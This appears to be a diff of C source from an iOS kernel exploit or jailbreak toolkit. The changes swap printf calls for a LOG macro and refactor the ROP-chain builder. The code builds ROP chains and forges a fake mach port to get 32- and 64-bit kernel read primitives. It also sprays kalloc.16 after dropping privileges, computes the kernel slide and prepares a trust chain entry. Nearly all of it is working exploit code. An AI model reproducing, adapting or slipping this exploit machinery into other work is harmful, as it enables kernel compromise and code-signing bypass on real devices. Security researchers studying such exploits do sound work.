@@ -113,7 +113,7 @@ uint64_t get_rop_var_addr(offset_struct_t * offsets, rop_var_t * ropvars, char *
 		}
 		ropvars = ropvars->next;
 	}
-	printf("Stage 2 ROP VAR %s not found\n",name);
+	LOG("Stage 2 ROP VAR %s not found",name);
 	exit(-1);
 }
 void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
@@ -154,7 +154,7 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 				break;
 			case BARRIER:
 				if (chain_pos > next->value) {
-					printf("not enought space to place barrier\n");
+					LOG("not enought space to place barrier");
 					exit(1);
 				}
 				uint64_t diff = next->value - chain_pos - offsets->stage2_base;
@@ -198,10 +198,10 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 					if (lookahead_gadget->type == ROP_LOOP_END) {loop_size += chain_for_loop_end;break;}
 					if (lookahead_gadget->type == ROP_LOOP_BREAK) {loop_size += chain_per_break;}
 					else {loop_size += 8;}
-					if (lookahead_gadget->type == ROP_LOOP_START) {printf("inner loops aren't supported atm\n");exit(1);}
+					if (lookahead_gadget->type == ROP_LOOP_START) {LOG("inner loops aren't supported atm");exit(1);}
 					lookahead_gadget = lookahead_gadget->next;
 				}
-				if (lookahead_gadget == NULL) {printf("Loop start without an end!\n");exit(1);}
+				if (lookahead_gadget == NULL) {LOG("Loop start without an end!");exit(1);}
 
 				rop_gadget_t * bck_next = next->next;
 				free(next);
@@ -304,7 +304,7 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 				}
 				break;
 			case ROP_LOOP_BREAK:
-				printf("ROP_LOOP_BREAK OUTSIDE OF A LOOP\n");
+				LOG("ROP_LOOP_BREAK OUTSIDE OF A LOOP");
 				exit(1);
 				break;
 			case ROP_LOOP_END:
@@ -321,7 +321,7 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 }
 uint64_t get_addr_from_name(offset_struct_t * offsets, char * name) {
 	uint64_t sym = (uint64_t)dlsym(RTLD_DEFAULT,name);
-	if (sym == 0) {printf("symbol (%s) not found\n",name);exit(1);}
+	if (sym == 0) {LOG("symbol (%s) not found",name);exit(1);}
 	uint64_t cache_addr = 0;
 	syscall(294, &cache_addr);
 	sym += 0x180000000;
@@ -354,7 +354,7 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 	int longjmp_buf = 1;
 	int pos = 0;
 	char * pos_buf = NULL;
-	printf("STAGE 2 DBG\nWe start with our chain here, x0 is pointing to that location (%llx) and we are in longjmp atm\n",offsets->stage2_base);
+	LOG("STAGE 2 DBG\nWe start with our chain here, x0 is pointing to that location (%llx) and we are in longjmp atm",offsets->stage2_base);
 	while (next != NULL) {
 		switch (next->type) {
 			case CODEADDR:
@@ -604,7 +604,7 @@ void build_databuffer(offset_struct_t * offsets, rop_var_t * ropvars) {
 		} 
 		buffer_size += current_var->size;
 		if (buffer_size > offsets->stage2_databuffer_len) {
-			printf("STAGE 3, DATABUFFER TO SMALL\n");
+			LOG("STAGE 3, DATABUFFER TO SMALL");
 			exit(-1);
 		}
 		// copy the variable into the buffer
@@ -649,6 +649,10 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 #if 0
 	DEFINE_ROP_VAR("reply_port",sizeof(mach_port_t),&buf);
 	CALL_FUNC_RET_SAVE_VAR("reply_port",get_addr_from_name(offsets,"mach_reply_port"),0,0,0,0,0,0,0,0);
+
+	DEFINE_ROP_VAR("a",8,&buf);
+	DEFINE_ROP_VAR("b",8,&buf);
+	ROP_VAR_ADD("a","a","b");
 
 	/*
 	struct __sigaction * myaction = malloc(sizeof(struct __sigaction));
@@ -951,7 +955,7 @@ _STRUCT_ARM_THREAD_STATE64
 	ROP_VAR_ARG64("reply_port",5); \
 	CALL("mach_msg",0,MACH_RCV_MSG | MACH_RCV_TIMEOUT | MACH_RCV_INTERRUPT,0,0,0 /*recv port*/, (usec+999)/1000, MACH_PORT_NULL,0);
 
-	ADD_USLEEP(100000);
+	ADD_USLEEP(100);
 
 	CALL("seteuid",501,0,0,0,0,0,0,0); // drop priv to mobile so that we leak refs/get the dicts into kalloc.16
 
@@ -1040,30 +1044,35 @@ _STRUCT_ARM_THREAD_STATE64
 
 	// get the heap addr
 	DEFINE_ROP_VAR("heap_addr",sizeof(uint64_t),tmp);
-	ROP_VAR_CPY_W_OFFSET("fakeport",offsetof(kport_t,ip_pdrequest) /*offset of fakeport.ip_pdrequest*/,"heap_addr",0,sizeof(uint64_t));
+	ROP_VAR_CPY_W_OFFSET("heap_addr",0,"fakeport",offsetof(kport_t,ip_pdrequest) /*offset of fakeport.ip_pdrequest*/,sizeof(uint64_t));
 
 	
 	// setup kr32
-	DEFINE_ROP_VAR("ip_requests_buf",0x20,tmp);
+	char * test_pattern = malloc(0x20);
+	for (int i = 0; i < 0x20;i++) {test_pattern[i]=i;}
+	DEFINE_ROP_VAR("ip_requests_buf",0x20,test_pattern);
 	SET_ROP_VAR64_TO_VAR_W_OFFSET("fakeport", offsetof(kport_t,ip_requests) /*offset of fakeport.ip_requests*/,"ip_requests_buf",0);
 
 	DEFINE_ROP_VAR("out_sz",8,tmp);
 	SET_ROP_VAR64("out_sz",1);
-#define kr32_raw(addr_var,valuename,offset) \
-	ROP_VAR_CPY_W_OFFSET("ip_requests_buf",offsets->ipr_size,addr_var,offset,8); \
+#define kr32(addr_var,valuename) \
+	ROP_VAR_CPY_W_OFFSET("ip_requests_buf",offsets->ipr_size,addr_var,0,8); \
 	ROP_VAR_ARG_HOW_MANY(4); \
 	ROP_VAR_ARG64("self",1); \
 	ROP_VAR_ARG64("the_one",2); \
 	ROP_VAR_ARG(valuename,4); \
 	ROP_VAR_ARG("out_sz",5); \
 	CALL("mach_port_get_attributes",0,0,MACH_PORT_DNREQUESTS_SIZE, 0, 0,0,0,0);
-#define kr32(addr_var,valuename) kr32_raw(addr_var,valuename,0);
+
 
 	// setup kr64
 
 	DEFINE_ROP_VAR("tmp_32_val",8,tmp);
+	DEFINE_ROP_VAR("upper_32_bits_addr",8,tmp);
 #define kr64(addr_val,valuename) \
-	kr32_raw(addr_val,"tmp_32_val",4); \
+	SET_ROP_VAR64("upper_32_bits_addr",4); \
+	ROP_VAR_ADD("upper_32_bits_addr","upper_32_bits_addr",addr_val); \
+	kr32("upper_32_bits_addr","tmp_32_val"); \
 	kr32(addr_val,valuename); \
 	ROP_VAR_CPY_W_OFFSET(valuename,4,"tmp_32_val",0,4);	
 
@@ -1074,9 +1083,6 @@ _STRUCT_ARM_THREAD_STATE64
 	ROP_VAR_ADD("heap_addr_recv_ptr","heap_addr_recv_ptr","heap_addr");
 	kr64("heap_addr_recv_ptr","recv_heap_addr");
 
-	ADD_LOOP_START("sleep");
-		ADD_USLEEP(1000);
-	ADD_LOOP_END();
 
 	// get the task pointer from our recv addr
 	DEFINE_ROP_VAR("task_pointer",8,tmp);
@@ -1114,6 +1120,10 @@ _STRUCT_ARM_THREAD_STATE64
 	DEFINE_ROP_VAR("kslide",8,tmp);
 	SET_ROP_VAR64("kslide",(UINT64_MAX - offsets->rootdomainUC_vtab + 1));
 	ROP_VAR_ADD("kslide","kslide","RootDomainUC_VTAB");
+
+	ADD_LOOP_START("sleep");
+		ADD_USLEEP(1000);
+	ADD_LOOP_END();
 
 	// fully setup trust chain entry now
 	DEFINE_ROP_VAR("bss_trust_chain_head",8,tmp);
